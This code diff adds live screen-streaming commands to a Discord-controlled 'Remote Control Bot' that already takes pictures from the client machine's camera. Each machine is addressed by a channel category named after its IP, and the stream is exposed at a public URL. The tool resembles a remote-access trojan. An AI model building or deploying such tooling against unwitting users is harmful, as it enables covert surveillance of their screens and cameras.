@@ -194,6 +194,63 @@ async def status(interaction : Interaction):
         await interaction.send(embed=embed, file=file)
         await interaction.delete_original_message()
 
+
+@client.slash_command(guild_ids=testServerId, description="Starts a high quality live session of the client's view.")
+async def start_live_session(interaction : Interaction):
+    category = interaction.channel.category
+    if str(category) == str(ip):
+        
+        user_id = interaction.user.id
+        await interaction.response.send_message("Starting live session...")
+        global process
+        process = subprocess.Popen(["python", os.path.join(os.path.abspath(os.path.dirname(__file__)), 'website.py')])
+        time.sleep(5)
+        with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'public_url.txt'), 'r') as f:
+            public_url = f.read()
+        embed = nextcord.Embed(description="Live session started", title=f"{public_url}", timestamp=datetime.now(), colour=0xb400f5)
+        embed.set_author(name="Remote Control Bot")
+        embed.set_footer(text="Remote Control Bot v1.3")
+
+        await interaction.send(embed=embed)
+        await interaction.delete_original_message()
+
+@client.slash_command(guild_ids=testServerId, description="Starts a low quality live session of the client's view.")
+async def start_lq_live_session(interaction : Interaction):
+    category = interaction.channel.category
+    if str(category) == str(ip):
+        
+        user_id = interaction.user.id
+        await interaction.response.send_message("Starting live session...")
+        global process
+        process = subprocess.Popen(["python", os.path.join(os.path.abspath(os.path.dirname(__file__)), 'lowqwebsite.py')])
+        time.sleep(5)
+        with open(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'lqpublic_url.txt'), 'r') as f:
+            public_url = f.read()
+        embed = nextcord.Embed(description="Live session started", title=f"{public_url}", timestamp=datetime.now(), colour=0xb400f5)
+        embed.set_author(name="Remote Control Bot")
+        embed.set_footer(text="Remote Control Bot v1.3")
+
+        await interaction.send(embed=embed)
+        await interaction.delete_original_message()
+
+@client.slash_command(guild_ids=testServerId, description="Stops live session.")
+async def stop_live_session(interaction : Interaction):
+    category = interaction.channel.category
+    if str(category) == str(ip):
+        
+        user_id = interaction.user.id
+        await interaction.response.send_message("Stopping live session")
+        if process is not None:
+            process.kill()
+        else:
+            interaction.response.send_message("No live session found")
+        embed = nextcord.Embed(description="Status", title=f"Live session stopped", timestamp=datetime.now(), colour=0xb400f5)
+        embed.set_author(name="Remote Control Bot")
+        embed.set_footer(text="Remote Control Bot v1.3")
+
+        await interaction.send(embed=embed)
+        await interaction.delete_original_message()
+
 @client.slash_command(guild_ids=testServerId, description="Sends a picture off of the client's camera.")
 async def take_picture(interaction : Interaction):
     category = interaction.channel.category
